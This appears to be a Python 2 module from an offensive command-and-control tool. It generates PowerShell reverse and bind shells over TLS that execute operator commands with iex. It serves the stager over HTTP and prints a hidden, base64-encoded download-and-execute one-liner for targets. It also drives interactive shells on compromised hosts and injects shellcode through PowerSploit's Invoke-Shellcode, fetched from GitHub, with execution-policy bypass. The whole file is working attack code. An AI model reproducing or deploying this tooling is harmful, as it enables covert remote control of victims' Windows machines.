from main import *
from menu import *

serverlist = []

def printListener():
    from listener import Server
    while True:
        bindOrReverse = raw_input(t.bold_green + '[?] (b)ind/[r]everse: ' + t.normal).lower()
        if bindOrReverse == 'b' or bindOrReverse == 'r':
            break
    if bindOrReverse == 'r':
        windows_powershell_stager = (
            "$c = New-Object System.Net.Sockets.TCPClient('" + FUNCTIONS().CheckInternet() + "','5555');"
            "$b = New-Object Byte[] 10500;"
            "$sl = New-Object System.Net.Security.SslStream $c.GetStream(),$false,({$True} -as [Net.Security.RemoteCertificateValidationCallback]);"
            "$sl.AuthenticateAsClient($env:computername);"
            "if ((New-Object Security.Principal.WindowsPrincipal ([Security.Principal.WindowsIdentity]::GetCurrent())).IsInRole([Security.Principal.WindowsBuiltinRole]::Administrator)){$ia = 'True'}else{$ia = 'False'};"
            "$h = \"`0\" + \"`0\" + $env:computername + ':' + $ia;"
            "$he = ([text.encoding]::ASCII).GetBytes($h,0,$h.Length);"
            "$sl.Write($he);"
            "while(1){$i = $sl.Read($b, 0, $b.Length);"
            "if ($i -lt 1){exit};"
            "$sb = New-Object -TypeName System.Text.ASCIIEncoding;"
            "$d = $sb.GetString($b,0, $i);"
            "if ($d.Length -gt 0){$cb = (iex -c $d 2>&1 | Out-String)};"
            "if ($error[0]){$cb = \"`0\" + ($error[0] | Out-String);$error.clear()};"
            "$sb = ([text.encoding]::ASCII).GetBytes($cb);"
            "$sl.Write($sb,0,$sb.Length);"
            "$sl.Flush()}"
        )
    else:
        windows_powershell_stager = (
            "$Base64Cert = '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';"
            "$CertPassword = 'password';"
            "$b = New-Object Byte[] 10500;"
            "$SSLcertfake = New-Object System.Security.Cryptography.X509Certificates.X509Certificate2([System.Convert]::FromBase64String($Base64Cert), $CertPassword);"
            "$listener = [System.Net.Sockets.TcpListener]5556;"
            "$listener.start();"
            "$client = $listener.AcceptTcpClient();"
            "$stream = $client.GetStream();"
            "$sl = New-Object System.Net.Security.SslStream $stream,$false,({$True} -as [Net.Security.RemoteCertificateValidationCallback]);"
            "$sl.AuthenticateAsServer($SSLcertfake, $false, [System.Security.Authentication.SslProtocols]::Tls, $false);"
            "if ((New-Object Security.Principal.WindowsPrincipal ([Security.Principal.WindowsIdentity]::GetCurrent())).IsInRole([Security.Principal.WindowsBuiltinRole]::Administrator)){$ia = 'True'}else{$ia = 'False'};"
            "$h = \"`0\" + \"`0\" + $env:computername + ':' + $ia;"
            "$he = ([text.encoding]::ASCII).GetBytes($h,0,$h.Length);"
            "$sl.Write($he);"
            "while(1){$i = $sl.Read($b, 0, $b.Length);"
            "if ($i -lt 1){exit};"
            "$sb = New-Object -TypeName System.Text.ASCIIEncoding;"
            "$d = $sb.GetString($b,0, $i);"
            "if ($d.Length -gt 0){$cb = (iex -c $d 2>&1 | Out-String)};"
            "if ($error[0]){$cb = \"`0\" + ($error[0] | Out-String);$error.clear()};"
            "$sb = ([text.encoding]::ASCII).GetBytes($cb);"
            "$sl.Write($sb,0,$sb.Length);"
            "$sl.Flush()}"
        )

    powershellFileName = 'p.ps1'
    with open((payloaddir()+ '/' + powershellFileName), 'w') as powershellStagerFile:
        powershellStagerFile.write(windows_powershell_stager)
        powershellStagerFile.close()
    randoStagerDLPort = random.randint(5000,9000)
    FUNCTIONS().DoServe(FUNCTIONS().CheckInternet(), powershellFileName, payloaddir(), port=randoStagerDLPort, printIt = False)
    print 'powershell -w hidden -noni -enc ' + ("IEX (New-Object Net.Webclient).DownloadString('http://" + FUNCTIONS().CheckInternet() + ":" + str(randoStagerDLPort) + "/" + powershellFileName + "')").encode('utf_16_le').encode('base64').replace('\n','')

    if bindOrReverse == 'b':
        if not '5556' in str(serverlist):
            ipADDR = raw_input(t.bold_green + '[?] IP After Run Bind Shell on Target: ' + t.normal)
            connectserver = Server(ipADDR, 5556, bindsocket=False)
            serverlist.append(connectserver)
            connectworker = threading.Thread(target=asyncore.loop, args=(0.1,))
            connectworker.setDaemon(True)
            connectworker.start()
    else:
        if not '5555' in str(serverlist):
            listenerserver = Server('0.0.0.0', 5555, bindsocket=True)
            serverlist.append(listenerserver)
            listenerworker = threading.Thread(target=asyncore.loop, args=(0.1,))
            listenerworker.setDaemon(True)
            listenerworker.start()
    return "pass"


def interactShell(clientnumber):
    sent = False
    clientnumber = int(clientnumber)
    from menu import clientMenuOptions
    for server in serverlist:
        if clientnumber in server.handlers.keys():
            print "Commands\n" + "-"*50 + "\nback - Background Shell\nexit - Close Connection\n" + "-"*50
            e = threading.Event()
            printer = threading.Thread(target=listenPrinter, args=(clientnumber, server, e))
            printer.setDaemon(True)
            printer.start()
            while True:
                command = raw_input("PS >")
                if command.lower() == "back":
                    e.set()
                    break
                elif command.lower() == "exit":
                    server.handlers[clientnumber].handle_close()
                    del clientMenuOptions[str(clientnumber)]
                    e.set()
                    time.sleep(2)
                    break
                elif command == "":
                    pass
                else:
                    server.handlers[clientnumber].out_buffer.append(command)
    return "clear"


def listenPrinter(clientnumber, server, e):
    from menu import clientMenuOptions
    while not e.isSet():
        if server.handlers[clientnumber].in_buffer:
            sys.stdout.write("\r" + " "*(len(readline.get_line_buffer())+2) + "\r")
            print server.handlers[clientnumber].in_buffer.pop()
            sys.stdout.write("PS >" + readline.get_line_buffer())
            sys.stdout.flush()
    sys.exit()

def clientUpload(fileToUpload,clientnumber,powershellExec,isExe):
    if isExe:
        newpayloadlayout = FUNCTIONS().powershellShellcodeLayout(powershellExec)
        encPowershell = "IEX(New-Object Net.WebClient).DownloadString('https://github.com/PowerShellMafia/PowerSploit/raw/master/CodeExecution/Invoke-Shellcode.ps1');Start-Sleep 30;Invoke-Shellcode -Force -Shellcode @(%s)"%newpayloadlayout.rstrip(',')
        encPowershell = base64.b64encode(encPowershell.encode('UTF-16LE'))
        powershellExec = "$Arch = (Get-Process -Id $PID).StartInfo.EnvironmentVariables['PROCESSOR_ARCHITECTURE'];if($Arch -eq 'x86'){powershell -exec bypass -enc \"%s\"}elseif($Arch -eq 'amd64'){$powershell86 = $env:windir + '\SysWOW64\WindowsPowerShell\\v1.0\powershell.exe';& $powershell86 -exec bypass -enc \"%s\"}"%(encPowershell,encPowershell)
    clientnumber = int(clientnumber)
    from menu import clientMenuOptions
    for server in serverlist:
        if clientnumber in server.handlers.keys():
            server.handlers[clientnumber].out_buffer.append(powershellExec)
